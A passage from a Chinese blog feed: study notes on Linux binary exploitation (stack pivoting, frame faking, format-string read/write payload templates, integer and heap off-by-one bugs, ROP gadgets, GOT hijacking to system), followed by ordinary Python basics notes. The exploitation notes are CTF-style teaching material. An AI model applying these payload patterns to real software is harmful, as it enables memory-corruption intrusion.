<strong>栈溢出的字节数较少</strong>，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，<strong>栈地址未知</strong>，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><p>此外，利用 stack pivoting 有以下几个要求</p><ul><li>可以<strong>控制程序执行流</strong>。</li><li>可以<strong>控制 sp 指针</strong>。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rsp/esp</span><br></pre></td></tr></table></figure><hr><h3 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a><strong>frame faking</strong></h3><p>构造一个虚假的栈帧来控制程序的执行流。</p><p><strong>要求：只能控制ebp和eip，要求知道可写入地址</strong></p><ul><li>入口点</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp  # 将ebp压栈</span><br><span class="line">mov ebp, esp #将esp的值赋给ebp</span><br></pre></td></tr></table></figure><ul><li>出口点</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret #pop eip，弹出栈顶元素作为程序下一个执行地址</span><br></pre></td></tr></table></figure><ul><li>leave 指令相当于</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp # 将ebp的值赋给esp</span><br><span class="line">pop ebp # 弹出ebp</span><br></pre></td></tr></table></figure><p>一般栈结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer padding|ebp|ret addr|</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer padding|fake ebp|leave ret addr|</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|target function addr|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure><p>then 栈结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure><h3 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h3><p> 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。</p><p><strong>要求：绕过PIE</strong></p><hr><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><hr><p>常用：</p><ul><li>%N$s</li><li>%N$p</li><li>%n$nx</li><li>%n$n</li><li>可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。</li></ul><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa%k$nxx</span><br></pre></td></tr></table></figure><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)+pad1+&apos;%k$hhn&apos;+pad2+&apos;%(k+1)$hhn&apos;+pad3+&apos;%(k+1)$hhn&apos;+pad4+&apos;%(k+1)$hhn&apos;</span><br></pre></td></tr></table></figure><p><strong>小技巧总结</strong></p><blockquote><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol></blockquote><blockquote><p> scanf 函数会对 0a，0b，0c，00 等字符有一些奇怪的处理，，导致无法正常读入，，</p></blockquote><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><hr><h3 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 伪代码</span><br><span class="line">short int a;</span><br><span class="line"></span><br><span class="line">a = a + 1;</span><br><span class="line"># 对应的汇编</span><br><span class="line">movzx  eax, word ptr [rbp - 0x1c]</span><br><span class="line">add    eax, 1</span><br><span class="line">mov    word ptr [rbp - 0x1c], ax</span><br><span class="line"></span><br><span class="line">unsigned short int b;</span><br><span class="line"></span><br><span class="line">b = b + 1;</span><br><span class="line"># assembly code</span><br><span class="line">add    word ptr [rbp - 0x1a], 1</span><br></pre></td></tr></table></figure><p>上界溢出有两种情况，一种是 <code>0x7fff + 1</code>， 另一种是 <code>0xffff + 1</code>。</p><table><thead><tr><th></th><th>有符号短整型</th><th>无符号短整型</th></tr></thead><tbody><tr><td>溢出点</td><td>0x7fff + 1</td><td>0xffff + 1</td></tr><tr><td>汇编语言</td><td>add    eax, 1</td></tr></tbody></table><p>mov    word ptr [rbp - 0x1c], ax | add    word ptr [rbp - 0x1a], 1 |</p><p><strong>共点</strong>： 从<strong>正数</strong>变成<strong>负数 or 0</strong></p><h3 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h3><p>第一种是 <code>sub 0x0000, 1 == 0xffff</code>，对于有符号来说 <code>0 - 1 == -1</code> 没问题，但是对于无符号来说就成了 <code>0 - 1 == 65535</code>。</p><p>第二种是 <code>sub 0x8000, 1 == 0x7fff</code>，对于无符号来说是 <code>32768 - 1 == 32767</code> 是正确的，但是对于有符号来说就变成了 <code>-32768 - 1 = 32767</code>。</p><p><strong>共点</strong>： 从<strong>负数 or 0</strong>变成<strong>正数</strong></p><h3 id="常见情况"><a href="#常见情况" class="headerlink" title="常见情况"></a>常见情况</h3><ul><li>未限制范围</li><li>错误的类型转换</li></ul><hr><h2 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h2><h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">//等同于</span><br><span class="line">ptr=malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure><p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数</p><p>realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p><ul><li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时<ul><li>如果申请 size &gt; 原来 size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li></ul></li><li>如果申请 size &lt; 原来 size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li><li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li></ul><p>###off-by-one 利用思路</p><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code>位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li></ol><p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check 。</p><h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p><strong>eax</strong>：编号    <strong>ebx，ecx，edx，esi，edi</strong>:参数及顺序</p><p>ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是 int 0x80。执行这条指令时，被调用函数的编号应存入 <strong>eax</strong>，调用参数应按顺序存入 <strong>ebx，ecx，edx，esi，edi</strong> 中。例如，编号125对应函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect (void *addr, size_t len, int prot)</span><br></pre></td></tr></table></figure><p>，可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。</p><h2 id="64位传参"><a href="#64位传参" class="headerlink" title="64位传参"></a>64位传参</h2><p><strong>顺序   RDI, RSI, RDX, RCX, R8, R9, more on the stack</strong></p><h2 id="libc-csu-init-妙用"><a href="#libc-csu-init-妙用" class="headerlink" title="libc_csu_init 妙用"></a>libc_csu_init 妙用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">gef➤  x/5i 0x000000000040061b</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">gef➤  x/5i 0x000000000040061A+3</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">gef➤  x/5i 0x000000000040061e</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x/5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure><h2 id="函数输入"><a href="#函数输入" class="headerlink" title="函数输入"></a>函数输入</h2><ul><li>read 不会给输入末尾补上 ‘\0’</li><li></li></ul><h2 id="变量的储存"><a href="#变量的储存" class="headerlink" title="变量的储存"></a>变量的储存</h2><ul><li>变量的存储格式为以小端存储，即最低有效位存储在低地址</li><li>已初始化的全局变量储存在代码中，不在堆栈中</li></ul><h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li>写入函数：write 函数。</li><li>ROP</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</span><br></pre></td></tr></table></figure><ul><li>格式化字符串任意地址写</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;LINUX-PWN&quot;&gt;&lt;a href=&quot;#LINUX-PWN&quot; class=&quot;headerlink&quot; title=&quot;LINUX PWN&quot;&gt;&lt;/a&gt;LINUX PWN&lt;/h1&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python</title>
    <link href="http://yoursite.com/2019/04/01/python/"/>
    <id>http://yoursite.com/2019/04/01/python/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:18.971Z</updated>
    
    <content type="html"><![CDATA[<p>#python之旅<br><a id="more"></a><br>[TOC]</p><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>print(str, end= “”)  print可以用end= “” 来控制不换行</p><p>“{x:&lt;y.zf}”.format()</p><p>{&lt;参数序号&gt;：&lt;填充&gt;&lt;对齐&gt;&lt;宽度&gt;&lt;,&gt;&lt;.精度&gt;&lt;类型&gt;}     &lt;,&gt;为千位分隔符</p><p>x为format中变量的序号，y为输出宽度，z为精度，&lt;^&gt;分别为靠左中右。</p><p>###数字类型及操作</p><p>abs()  绝对值</p><p>divmov(x, y)  商余 x//y, x%y    如divmov(10, 3) 得(3, 1)</p><p>pow(x, y[, z])    幂余x**y%z</p><p>round(x[, d])   x保留 d位</p><p>max(…)</p><p>min(…)</p><p>int(x)</p><p>float(x)   #转换成浮点数，，，无论str还是int，</p><h3 id="字符串类型及操作"><a href="#字符串类型及操作" class="headerlink" title="字符串类型及操作"></a>字符串类型及操作</h3><p>切片 &lt;字符串&gt;[M: N: K]      M开始 N前结束 K步长 <code>s[::-1]</code> 反序字符串</p><p>+连接字符串</p><p>*复制字符串</p><p>len(x)</p><p>str(x) 将x转换成字符串类型 eval(x) 转换成int</p><p>hex(x) oct(x)  转换成16 8 进制</p><p>chr(u)  u为Unicode编码，返回对应的字符</p><p>ord(x) x为字符，返回Unicode编码</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>str.lower()</p><p>str.upper()</p><p>str.split(sep)   返回一个列表，如<code>&quot;a,b,c&quot;.split(&quot;,&quot;)</code>  返回<code>[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]</code></p><p>str.count(sub)    返回sub在str里出现的次数</p><p> str,replace(old, new)  将old子串换成new</p><p>str.center(width[,fillchar])   str根据宽度width居中，两边用fillchar填充</p><p>str.strip(chars)    去掉str左右两侧chars包含的字符</p><p>str.join(iter)   在str除最后元素外的每个字符后加一个iter</p><h3 id="time库"><a href="#time库" class="headerlink" title="time库"></a>time库</h3><p>####获取时间</p><p>time.time()   返回时间戳 1970.1.1 0:0开始 s为单位</p><p>time.ctime()   返回字符串  易读时间</p><p>time.gmtime()    获取当前时间 表示为计算机可处理的时间格式</p><h4 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h4><p>strftime(tpl, rs)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = time.gmtime()</span><br><span class="line">time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>,t)</span><br><span class="line"><span class="string">'2018-01-26 12:55:20'</span></span><br></pre></td></tr></table></figure><p>tpl是格式化的输出格式控制</p><p>%Y年 </p><p>%m月(数字) %B月份名称 %b缩写 </p><p>%d日期 </p><p>%A星期 %a缩写 </p><p>%H时间 24h %h 时间12h </p><p>%p上下午</p><p> %M分钟  </p><p>%s 秒</p><p>strptime(str, tpl)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">timeStr = <span class="string">'2018-01-26 12:55:20'</span></span><br><span class="line">time.strptime(timeStr, <span class="string">"%Y-%m-%d %H:%M:%S"</span>)</span><br></pre></td></tr></table></figure><h4 id="程序计时"><a href="#程序计时" class="headerlink" title="程序计时"></a>程序计时</h4><p>perf_counter() </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start = time.perf_counter()</span><br><span class="line">end = time.perf_counter()</span><br><span class="line">t = end - start</span><br></pre></td></tr></table></figure><p>差值才有意义</p><p>sleep(s)</p><h4 id="二分支结构"><a href="#二分支结构" class="headerlink" title="二分支结构"></a>二分支结构</h4><p>表达式1 if 条件 else 表达式2</p><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line"><span class="keyword">finally</span>:</span><br></pre></td></tr></table></figure><h4 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h4><p>send() 设置种子</p><p>random()产生随机数</p><p>不设置种子就会使用当时的系统时间作为种子</p><p>randint(a, b)  产生一个[a,b]之间的随即整数</p><p>randrange(m, n[, k]) 产生一个[m, n)之间的以k为步长的随即整数</p><p>getrandbits(k)   生成一个k比特长的随机整数</p><p>uniform(a, b)  生成一个[a, b]之间的随机小数，精度16位</p><p>choice(seq) 从序列seq中随机选择一个元素</p><p>shuffle(seq)   将序列seq中的元素随机排列</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>lambda函数</p><p>&lt;函数名&gt; = lambda &lt;参数&gt; : &lt;表达式&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="keyword">lambda</span> x, y : x + y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f(<span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure><h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p><strong>可以将py文件编译成可执行文件</strong></p><ul><li><strong>-h</strong>: help</li><li><strong>–clean</strong>: 清理打包过程中的临时文件</li><li><strong>-D，–onedir</strong> ：默认值，生成dist文件夹</li><li><strong>-F, –onedir</strong> : 在dist文件夹中只生成独立的打包文件</li><li><strong>-i &lt;图标文件名.ico&gt;</strong> :  指定打包程序使用的图标文件</li></ul><h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><ul><li>无序</li><li>元素唯一，不相同</li><li>元素不变，是不可更改的数据类型</li></ul><ul><li>{}来表示，元素之间逗号分隔</li><li>建立集合用{} 或者set()（建立空集合必备）</li></ul><h5 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h5><ul><li>S|T     返回一个新的集合，包括S和T的所有元素</li><li>S  - T 包括在S但是不在T的元素</li><li>S &amp; T 同时在S和T中的元素</li><li>S ^ T S和T中不相同的元素</li><li>S &lt;= T     S &lt; T 返回True/False，判断S和T的子集关系</li><li>S &gt;= T     S &gt; T 判断包含关系</li></ul><h6 id="增强操作符"><a href="#增强操作符" class="headerlink" title="增强操作符"></a>增强操作符</h6><ul><li>S |= T 更新集合S，S和T中的所有元素</li><li>S -= T</li><li>S &amp;= T</li><li>S ^= T</li></ul><h4 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h4><ul><li>S.add(x)  将x增加到S</li><li>S.discard(x)  移除X，x不在不报错</li><li>S.remove(x)   同上，但是若X不在S中，产生KeyError异常</li><li>S.clear()  移除所有元素</li><li>S.pop() 随机返回S的一个元素，更新S，S为空则产生KeyError异常</li><li>S.copy() 返回S的副本</li><li>len(S)  返回S的元素个数</li><li>x in S 判断x是否在S中</li><li>x not in S</li><li>set(x)</li></ul><h3 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h3><ul><li>具有先后关系的的一组元素</li><li>元素对象可以相同，类型可以不同</li><li>元素由序号引导，通过下标访问元素</li></ul><h4 id="衍生"><a href="#衍生" class="headerlink" title="衍生"></a>衍生</h4><ul><li>字符串类型</li><li>元组类型</li><li>列表类型</li></ul><h4 id="序列处理函数及方法"><a href="#序列处理函数及方法" class="headerlink" title="序列处理函数及方法"></a>序列处理函数及方法</h4><ul><li>x in s</li><li>x not in s</li><li>s + t 连接两个序列</li><li><strong>s*n</strong> 或 <strong>n*s</strong> 序列s复制n次</li><li><strong>s[i]</strong> 返回第i个元素</li><li><strong>s[i: j: k]</strong> 切片 返回i到j以k为步长的元素子序列<ul><li>栗子 s[::-1] 逆向返回所有元素</li></ul></li></ul><ul><li>len(s) 返回长度</li><li>min(s)  </li><li>max(s)</li><li>s.index(x) 或 s.index(x, i, j) 返回从i到j位置，x第一次出现的位置</li><li>s.count(x)  返回序列中x出现的次数</li></ul><h4 id="元组类型"><a href="#元组类型" class="headerlink" title="元组类型"></a>元组类型</h4><ul><li>一旦创建，不能修改</li><li>用() 或者tuple() 创建，元素间用逗号分隔</li><li>可以使用()，也可以不用<ul><li>如程序返回值</li></ul></li></ul><h4 id="列表类型"><a href="#列表类型" class="headerlink" title="列表类型"></a>列表类型</h4><ul><li>创建之后可以修改</li><li>用[] 或list() 来创建，逗号分隔</li><li>元素类型可以不同，没有长度限制</li></ul><ul><li>赋值<ul><li>t = s 类似重新命名</li></ul></li></ul><ul><li><p>ls[i, j, k] = lt 将i到j步长为k的元素替换为lt</p></li><li><p>del ls[i] 删除第i元素</p></li><li>del ls[i, j, k]</li><li>ls +=lt lt加到ls ，更新ls</li><li>ls *= n 更新ls，元素重复n遍</li></ul><ul><li>ls.append(x) 在最后加一个x</li><li>ls.clear() 删除全部元素</li><li>ls.copy() 复制列表，生成新的列表</li><li>ls .insert(i, x) 第i位置增加x</li><li>ls.pop(i) 第i位置的元素取出并删除</li><li>ls.remove(x) 删了第一个出现的x</li><li>ls.reverse()  将元素反转   </li></ul><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>理解“<strong>映射</strong>”：键(索引)和值(数据)的对应</p><ul><li>键值对：键是数据索引的扩展</li><li>字典是键值对的<strong>集合</strong>，键值对之间无序</li><li>采用大括号{} 和dict()创建，键值对用冒号表示，逗号分隔</li></ul><h4 id="字典处理函数及操作方法"><a href="#字典处理函数及操作方法" class="headerlink" title="字典处理函数及操作方法"></a>字典处理函数及操作方法</h4><ul><li>del d[k] 删除字典d中键k对应的数据值</li><li>k in d   键k是否在字典d中</li><li>d.key() 返回字典d中所有的键信息</li><li>d.values()  返回字典d中所有的值信息  <ul><li>返回值可以用for in来遍历，但是不能当列表来操作</li></ul></li><li>d.items()  返回字典d中所有键值对的信息</li><li><code>d.get(k, &lt;default&gt;)</code> 返回键k对应的值，不存在则返回<code>&lt;default&gt;</code>值</li><li><code>d.pop(k, &lt;default&gt;)</code> 取出</li><li>d.popitem() 随机从字典d中取出一个键值对，元组形式返回</li><li>d.clear() 清空</li><li>len(d)  返回元素个数</li></ul><p>栗子 向d新增两个键值对元素 d[“a”] = 1; d[“b”] = 2</p><h3 id="jieba库"><a href="#jieba库" class="headerlink" title="jieba库"></a>jieba库</h3><p>中文分词</p><p>安装<code>pip install jieba</code></p><h4 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h4><ul><li>精确模式<ul><li>jieba.lcut(s) 精确模式，返回一个列表类型 的分词结果</li></ul></li><li>全模式 <ul><li>jieba.lcut(s, cut_all=True)</li></ul></li><li>搜索引擎模式<ul><li>jieba.lcut_for_search(s) </li></ul></li><li>jieba.add_word(w) 向分词词典增加新词w</li></ul><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="文件的打开和关闭"><a href="#文件的打开和关闭" class="headerlink" title="文件的打开和关闭"></a>文件的打开和关闭</h4><p>&lt;变量名&gt; = open(&lt;文件名&gt;, &lt;打开模式&gt;)</p><h5 id="打开模式"><a href="#打开模式" class="headerlink" title="打开模式"></a>打开模式</h5><ul><li>r 只读，若文件不存在返回FileNotFountError</li><li>w 覆盖写模式，存在则完全覆盖</li><li>x 创建写模式，存在则返回FileExistsError</li><li>a 追加写模式，存在则在最后追加内容</li><li>b 二进制</li><li>t 文本文件模式</li><li><strong>+</strong> 增加功能</li></ul><p>&lt;变量名&gt;.close()</p><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><ul><li>f.read()  读入全部内容，如果给参数则读入size长度</li><li>f.readline() 读入一行内容，如果给参数则读入前size个</li><li>f.readllines() 读入所有行，以每行为元素形成 <strong>列表</strong>  